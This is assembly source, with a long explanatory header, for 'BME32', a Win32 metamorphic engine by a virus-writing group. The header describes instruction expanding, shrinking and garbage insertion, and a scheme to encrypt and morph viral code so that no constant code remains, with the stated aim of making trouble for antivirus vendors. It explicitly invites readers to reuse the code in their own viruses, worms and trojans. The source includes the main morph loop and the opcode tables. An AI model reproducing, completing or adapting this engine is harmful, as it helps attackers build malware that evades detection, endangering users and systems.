COMMENT &

 ==========================================================================
 ==========================================================================
 ================== Benny's Metamorphic Engine for Win32 ==================
 ============================= (BME32 beta 1) =============================
 ==========================================================================

Lemme introduce you my metamorphic engine, called BME32. Although its not
finished (becoz of lack of time) it shows an interesting way how to realise
the metamorphic idea. Some readerz may remember the article I wrote about
metamorphism in 29A#4. There I tried to explain my idea how should good
meta-engine work. I tried to code it many timez and every time I didn't 
succeeded. Why? Becoz of complexity of the concept.

Let's resume the original concept. Good meta-engine should be able to:

1)	expand single instructionz to complex set of instructionz that does
	the same thing as the original

e.g.	STOSD	->	MOV	[EDI],EAX
			ADD	EDI,4

2)	shrink known sets of instructionz to single instruction (reverse
	action of expanding)

e.g.	MOV	[EDI],EAX	->	STOSD
	ADD	EDI,4

3)	insert garbage code among instructionz

e.g.	CALL	@1
	JMP	@2
@1:	RET
@2:	...

4)	relocate ALL relativitiez (pointerz, jumpz, etc...)

Well, what was the problem? For me VERY BIG problem was the last point (4).
I wasn't able to code such complex engine that could be able to deal with
it. The last point always brought the biggest problemz so I decided to solve
it another way.

I solved it in this engine :-) All instructionz in the code has the constant
length (ten bytez, if the instruction aint so long, the rest is filled with
garbage code) and so the (4) point is solved - very easily and effectively.

So, what's the result? This engine can work with specialy prepared code,
supportz even unknown instructionz, garbage routinez, shrinker and expander.

Here follows the algorithm of the engine:

assumptionz:
(1)	ESI = offset of i/o buffer, ECX = length, EBP = delta offset
(2)	ECX mod 10 = 0
(3)	no self-modifying code and hardcodez
(4)	D flag MUST be set to 0 by default (no use of STD instruction)
(5)	all instructionz has fixed length (macroz in macros.inc)
(6)	random number generator is already initialized by the RANDOMIZE
	procedure

algorithm:
(1)	1:2 instruction will be morphed (if not, goto (3) label)
(2)	read and analyse instruction (if its known instruction then
	(a)	randomly shrink/expand the instruction
	(b)	put random garbage code after the morphed instruction, if
		there's a place
(3)	if it's unknown instruction then skip 10 bytez
(4)	ECX -= 10 AND goto (1)


------------------------------------------------------------------------
Expander:
					----->		MOV(2*)	EAX,EDX

							PUSH	EDX
		MOV(1*)	EAX,EDX		----->		XCHG	EAX,EDX
							POP	EDX
	
							PUSH	EDX
					----->		POP	EAX
------------------------------------------------------------------------

Shrinker:
		MOV(2*)	EAX,EDX	(1)	----->

		PUSH	EDX
		XCHG	EAX,EDX (2) 	----->		MOV(1*)	EAX,EDX
		POP	EDX

		PUSH	EDX
		POP	EAX	(3)	----->
------------------------------------------------------------------------

*)	x-86 opcode table containz 2 versionz of MOV opcode.
	1)	reg1->reg2	1000 100w : 11 reg1 reg2
	2)	reg2->reg1	1000 101w : 11 reg1 reg2

Becoz of some not very competent human inside Intel ONE instruction can
be written by many opcodez. Thnx for that :-)
------------------------------------------------------------------------

Easy, eh? :)

This engine ain't completely finished, but it has a very solid sceleton. If
you want to re-use my code for your own engine, ALL you need to finish is
support for more instructionz - see "instructionz" label. There you only
need to add new record for shrinking/expanding and add the shrinker/expander
code to morpher.inc. That's all. This engine can work well anyway, if the
morpher cannot handle the found instruction, it simply skipz over it - so,
this engine can morph all known instructionz and those unknown will keep as
they are (detection is very easy then). Nevertheless, I think that if someone
would implement ALL needed instructionz, the engine would cause *some*
problemz to AVerz :)

One problem is with constant part of the engine, the non-code bytez. My idea
how to solve it follows:

assumptionz:
(1)	we have BME32 ;-)
(2)	we have decryptor code, after which follows the buffer with code
	(containing some virus together with whole BME32)

algorithm:
(1)	create random key and store it to decryptor code
(2)	morph the code inside buffer by BME32
(3)	encrypt buffer with random key
(4)	morph the decryptor by BME32

The result of this is that we have RANDOM decryptor - after decryption we
have unencrypted RANDOM viral code. ABSOLUTELLY NO CONSTANT CODE. If nothing
more, then the result is at least pretty advanced polymorphic code ;-)

THIS CODE IS CREDITWARE - You can freely use the code placed below in your
own viral malware (virus, worm, trojan...) without paying. All you have to
do is just place creditz in the source code :-)

The source consists of 5 modulez:

bme32.asm	(this/main source)
macros.inc	(macro deffinitionz for instruction alignment)
morpher.inc	(code of metamorpher)
garbager.inc	(code of garbager)
random.inc	(code of pseudo-random number generator)

win32api.inc	(standard 29A include file)
useful.inc	(---------- " " ----------)


NOTE:	Code ain't optimized much - that's becoz of the meta-featurez. Such
	un-optimized instructionz are easier handled by metamorphic engine...


Enjoy the code!

		....................................................
		.			Benny / 29A
		.			benny@post.cz
		.			http://benny29a.cjb.net
		.
		... perfectionist, maximalist, idealist, dreamer ...

&


.386p
.model	flat

include	win32api.inc
include	useful.inc
include	macros.inc					;include macro declarationz


MAXINSTRLENGTH	equ	10				;size of one instruction



.data
	metabuffer	db	end_morphing-Start dup (?)	;buffer for code


.code
Start:
i1	pushad
	SEH_SetupFrame	<i2	jmp	end_seh>

i2	call	gdelta
gdelta:
i3	mov	ebp,[esp]
i3	add	ebp,MAXINSTRLENGTH-5			;get delta offset to EBP
i3	sub	esp,4

i2	call	RANDOMIZE				;initialize random-engine

i3	lea	esi,[ebp+Start-gdelta]			;start of code
i3	mov	ecx,end_morphing-Start			;length of code
i3	lea	edi,metabuffer				;destination
i2	push	edi
i2	push	ecx
i2	rep	movsb					;copy code to buffer
i2	pop	ecx
i2	pop	esi
i2	call	BME32					;and morph code inside buffer
i1	popad

end_seh:
	SEH_RemoveFrame
i2	push	0
i2	invoke	ExitProcess				;quit...



;========================================================================================
;========================================================================================
;========================= Benny's Metamorphic Engine for Win32 =========================
;==================================== (BME32 beta 1) ====================================
;========================================================================================
;
;INPUT:
;	ESI	-	ptr to code prepared for meta-morphing
;	ECX	-	length of the code
;	EBP	-	proper delta offset
;
;OUTPUT:
;	morpher instructionz in the specified buffer
;
;========================================================================================


BME32	Proc						;BME32 starts here...
i2	pushad

i2	call	RANDOM2					;get rnd number - <0,1>
i2	dec	eax
;i2	je	skip_BME32		;***********	;dont morph this instruction

i3	xor	ecx,ecx
i2	call	MORPHER					;morph instruction
i2	jecxz	skip_BME32				;-> instruction couldnt be morphed

i3	add	esi,MAXINSTRLENGTH			;get to next instruction
i2	call	GARBAGER				;insert garbage code

end_BME32:
i3	mov	[esp.Pushad_esi],esi
i1	popad
i3	sub	ecx,MAXINSTRLENGTH			;decrease counter at one instruction
i2	jecxz	e_BME32
i2	jmp	BME32
e_BME32:
i1	ret

skip_BME32:
i3	add	esi,MAXINSTRLENGTH			;next instruction
i2	jmp	end_BME32


include	garbager.inc					;garbager routinez
include	morpher.inc					;morpher routinez
include	random.inc					;rnd-engine routinez


end_morphing:						;do not morph instructionz below this

signature	db	0,'[BME32]',0			;little signature :-)

garbage_wrap:						;addresses of garbager routinez
	dd	offset e_GRB-offset gdelta
	dd	offset GRB1-offset gdelta
	dd	offset GRB2-offset gdelta
	dd	offset GRB3-offset gdelta
	dd	offset GRB4-offset gdelta
	dd	offset GRB5-offset gdelta
	dd	offset GRB6-offset gdelta
	dd	offset GRB7-offset gdelta
	dd	offset GRB8-offset gdelta
	dd	offset GRB9-offset gdelta
grb1:	nop						;single-byte garbage code
	cld
	cs:
	ds:
	es:
	fs:
grb2:	pushfd						;2-byte garbage code
	popfd
	pushad
	popad
	push	eax
	pop	eax
	push	ebx
	pop	ebx
	push	ecx
	pop	ecx
	push	edx
	pop	edx
	push	esp
	pop	esp
	push	ebp
	pop	ebp
	push	esi
	pop	esi
	push	edi
	pop	edi
	mov	eax,eax
	mov	ebx,ebx
	mov	ecx,ecx
	mov	edx,edx
	mov	ebp,ebp
	mov	esi,esi
	mov	edi,edi
	xchg	ebx,ebx
	xchg	ecx,ecx
	xchg	edx,edx
	xchg	ebp,ebp
	xchg	esi,esi
	xchg	edi,edi
	jmp	$+2
	dw	9066h
	dw	9067h
	dw	0FC66h
	dw	0FC67h
grb3:	xor	eax,0
	add	eax,0
	sub	eax,0
	or	eax,0
	and	eax,-1
grb6:	db	81h,0C0h,0,0,0,0	;add	eax,0
	db	81h,0C8h,0,0,0,0	;or	eax,0
	db	81h,0E0h,-1,-1,-1,-1	;and	eax,-1
	db	81h,0E8h,0,0,0,0	;sub	eax,0
	db	81h,0F0h,0,0,0,0	;xor	eax,0


;the list of supported instructionz:
;syntax:
;
;==repeat==
;	DD	offset of the proper instruction morpher routine MINUS delta offset
;--repeat--
;	DB	offset of byte inside instruction (if signed, byte is variable <0,7>
;		(e.g. register))
;	DB	byte inside instruction
;--repeat--
;	...
;	NULL
;==repeat==
;	...
;	NULL

instructionz:

;shrinker part

	dd	offset shr_pushad-offset gdelta
	db	1,50h,2,51h,3,52h,4,53h,5,54h,6,55h,7,56h,8,57h,0
	dd	offset shr_popad-offset gdelta
	db	1,5Fh,2,5Eh,3,5Dh,4,5Ch,5,5Bh,6,5Ah,7,59h,8,58h,0
	dd	offset shr_movexx-offset gdelta
	db	-1,0B8h,6,0F7h,-7,0D0h,0
	dd	offset shr_movexx-offset gdelta
	db	-1,0B8h,6,0F7h,-7,0D8h,0
	dd	offset shr_movexx2-offset gdelta
	db	1,0C7h,-2,0C0h,0
	dd	offset shr_ljmp1-offset gdelta
	db	1,0E9h,0
	dd	offset shr_ljmp2-offset gdelta
	db	1,0EBh,2,02h,3,0EBh,5,0EBh,6,-4,0
	dd	offset shr_ljmp3-offset gdelta
	db	1,0EBh,2,05h,3,0E9h,8,0EBh,9,-7,0
	dd	offset shr_sjxx1-offset gdelta
	db	1,0Fh,-2,80h,0
	dd	offset shr_sjxx1-offset gdelta
	db	1,0Fh,-2,88h,0
	dd	offset shr_sjxx2-offset gdelta
	db	-1,70h,2,05h,3,0E9h,0
	dd	offset shr_sjxx2-offset gdelta
	db	-1,78h,2,05h,3,0E9h,0
	dd	offset shr_sjxx3-offset gdelta
	db	-1,70h,2,02h,3,0EBh,0
	dd	offset shr_sjxx3-offset gdelta
	db	-1,78h,2,02h,3,0EBh,0
	dd	offset shr_ret-offset gdelta
	db	1,83h,2,0C4h,3,04h,4,0FFh,5,64h,6,24h,7,0FCh,0
	dd	offset shr_ret-offset gdelta
	db	1,83h,2,0ECh,3,0FCh,4,0FFh,5,64h,6,24h,7,0FCh,0
	dd	offset shr_retx-offset gdelta
	db	1,83h,2,0C4h,4,0FFh,5,64h,6,24h,0
	dd	offset shr_retx-offset gdelta
	db	1,83h,2,0ECh,4,0FFh,5,64h,6,24h,0
	dd	offset shr_inc-offset gdelta
	db	1,83h,-2,0C0h,0
	dd	offset shr_dec-offset gdelta
	db	1,83h,-2,0E8h,0
	dd	offset shr_call-offset gdelta
	db	-1,50h,-2,58h,3,0E8h,0
	dd	offset shr_jecxz1-offset gdelta
	db	1,85h,2,0C9h,3,74h,0
	dd	offset shr_jecxz2-offset gdelta
	db	1,85h,2,0C9h,3,0Fh,4,84h,0
	dd	offset shr_stosb-offset gdelta
	db	1,88h,2,07h,3,47h,0
	dd	offset shr_stosb-offset gdelta
	db	1,66h,2,0AAh,0
	dd	offset shr_stosw-offset gdelta
	db	1,66h,2,89h,3,07h,4,83h,5,0C7h,6,02h,0
	dd	offset shr_stosd-offset gdelta
	db	1,89h,2,07h,3,83h,4,0C7h,5,04h,0
	dd	offset shr_lodsb-offset gdelta
	db	1,8Ah,2,06h,3,46h,0
	dd	offset shr_lodsd-offset gdelta
	db	1,8Bh,2,06h,3,83h,4,0C6h,5,04h,0
	dd	offset shr_pushexx-offset gdelta
	db	1,0FFh,-2,0F0h,0
	dd	offset shr_popexx-offset gdelta
	db	1,08Fh,-2,0C0h,0

;expander part

	dd	offset exp_pushad-offset gdelta
	db	1,60h,0
	dd	offset exp_popad-offset gdelta
	db	1,61h,0
	dd	offset exp_movexx-offset gdelta
	db	-1,0B8h,0
	dd	offset exp_inc-offset gdelta
	db	-1,40h,0
	dd	offset exp_dec-offset gdelta
	db	-1,48h,0
	dd	offset exp_ljmp-offset gdelta
	db	1,0E9h,0
	dd	offset exp_sjmp-offset gdelta
	db	1,0EBh,0
	dd	offset exp_sjxx-offset gdelta
	db	-1,70h,0
	dd	offset exp_sjxx-offset gdelta
	db	-1,78h,0
	dd	offset exp_ret-offset gdelta
	db	1,0C3h,0
	dd	offset exp_retx-offset gdelta
	db	1,0C2h,0
	dd	offset exp_call-offset gdelta
	db	1,0E8h,0
	dd	offset exp_jecxz-offset gdelta
	db	1,0E3h,0
	dd	offset exp_addeax-offset gdelta
	db	1,05h,0
	dd	offset exp_subeax-offset gdelta
	db	1,2Dh,0
	dd	offset exp_add-offset gdelta
	db	1,81h,-2,0C0h,0
	dd	offset exp_sub-offset gdelta
	db	1,81h,-2,0E8h,0
	dd	offset shr_incb-offset gdelta
	db	1,80h,-2,0C0h,0
	dd	offset shr_decb-offset gdelta
	db	1,80h,-2,0E8h,0
	dd	offset exp_stosb-offset gdelta
	db	1,0AAh,0
	dd	offset exp_stosw-offset gdelta
	db	1,66h,2,0ABh,0
	dd	offset exp_stosd-offset gdelta
	db	1,0ABh,0
	dd	offset exp_lodsb-offset gdelta
	db	1,0ACh,0
	dd	offset exp_lodsd-offset gdelta
	db	1,0ADh,0
	dd	offset exp_pushexx-offset gdelta
	db	-1,50h,0
	dd	offset exp_popexx-offset gdelta
	db	-1,58h,0
	dd	offset exp_mov-offset gdelta
	db	1,88h,0					;byte reg
	dd	offset exp_mov-offset gdelta
	db	1,89h,0					;dword reg
	dd	offset exp_mov-offset gdelta
	db	1,8Ah,0					;byte reg
	dd	offset exp_mov-offset gdelta
	db	1,8Bh,0					;dword reg

end_virus:
	dd	?					;end of record

rnd32_seed	dd	?				;random seed variable

BME32	EndP						;...BME32 endz here

;========================================================================================
;========================================================================================
;========================================================================================
;========================================================================================

virtual_end:
ends
End	Start